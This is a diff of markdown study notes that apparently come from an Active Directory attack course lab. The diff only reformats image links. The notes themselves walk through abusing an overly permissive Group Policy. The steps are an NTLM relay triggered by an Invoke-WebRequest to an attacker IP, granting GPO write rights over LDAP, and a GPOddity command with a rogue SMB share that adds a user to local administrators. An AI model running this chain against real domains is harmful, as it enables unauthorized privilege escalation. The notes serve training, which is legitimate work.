@@ -1,4 +1,4 @@
-![[assets/Pasted image 20260131032100.png|Pasted image 20260131032100.png]]
+![Pasted image 20260131032100.png](assets/Pasted%20image%2020260131032100.png)
 - PowerView has Immediate Scheduled Task exploitation
 	- not covered in this course
 
@@ -11,7 +11,7 @@
 ## Learning Objective
 
 Abuse an overly permissive Group Policy to add student to the local administrator group on dcorp-ci
-![[assets/Pasted image 20260203024427.png|Pasted image 20260203024427.png]]
+![Pasted image 20260203024427.png](assets/Pasted%20image%2020260203024427.png)
 - Open PowerView
 	- `C:\AD\Tools\PowerView.ps1`
 - Get GPO info
@@ -21,7 +21,7 @@ Abuse an overly permissive Group Policy to add student to the local administrato
 	- if it doesn't work, may have to change SMB settings in config
 - need to create a shortcut that will connect to DC and relay back
 	- create shortcut in attacker machine, then copy over to victim and execute
-![[assets/Pasted image 20260203024753.png|Pasted image 20260203024753.png]]
+![Pasted image 20260203024753.png](assets/Pasted%20image%2020260203024753.png)
 - `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://<attacker_ip>' -UseDefaultCredentials"`
 
 - connect to LDAP shell
@@ -32,11 +32,11 @@ Abuse an overly permissive Group Policy to add student to the local administrato
 - grant user permissions over GPO
 	- `write_gpo_dacl <user> {GPO_GUID}'`
 		- GPO GUID can be found in GPO info dump (check "Get GPO Info above)
-![[assets/Pasted image 20260203025405.png|Pasted image 20260203025405.png]]
+![Pasted image 20260203025405.png](assets/Pasted%20image%2020260203025405.png)
 
 - once the user has write permissions over the GPO, you can run the GPOddity command to elevate
 	- `sudo python3 gpoddity.py --gpo-id '<GPO_GUID>' --domain '<DOMAIN>' --username '<compromised_user>' --password '<pass>' --command 'net localgroup administrators <compromised_user> /add' --rogue-smbserver-ip '<attacker_ip>' --rogue-smbserver-share '<share_name>' --dc-ip <DC_IP> --smb-mode none`
-![[assets/Pasted image 20260203025903.png|Pasted image 20260203025903.png]]
+![Pasted image 20260203025903.png](assets/Pasted%20image%2020260203025903.png)
 - make sure to create folder that matches the name of the share_name given
 
 - as soon as you run GPOddity, it creates a GPO template, so copy it over to share created
@@ -45,13 +45,13 @@ Abuse an overly permissive Group Policy to add student to the local administrato
 - create and server the share, then grant everyone access
 	- `share <share_name>=C:\path\to\share`
 	- `icacls "C:\path\to\share" /grant Everyone:F /T`
-![[assets/Pasted image 20260203030320.png|Pasted image 20260203030320.png]]
+![Pasted image 20260203030320.png](assets/Pasted%20image%2020260203030320.png)
 
 - verify the attack worked -- GPO should now point to share
 	- `Get-DomainGPO -Identity '<GPO>`
-![[assets/Pasted image 20260203030413.png|Pasted image 20260203030413.png]]
+![Pasted image 20260203030413.png](assets/Pasted%20image%2020260203030413.png)
 - in this env, Group Policy updates every couple minutes, may be different on other envs
 
 - test if the exploit worked
 	- `winrs -r:<computer_name> cmd /c "set computername && set username"`
-![[assets/Pasted image 20260203030735.png|Pasted image 20260203030735.png]]
+![Pasted image 20260203030735.png](assets/Pasted%20image%2020260203030735.png)
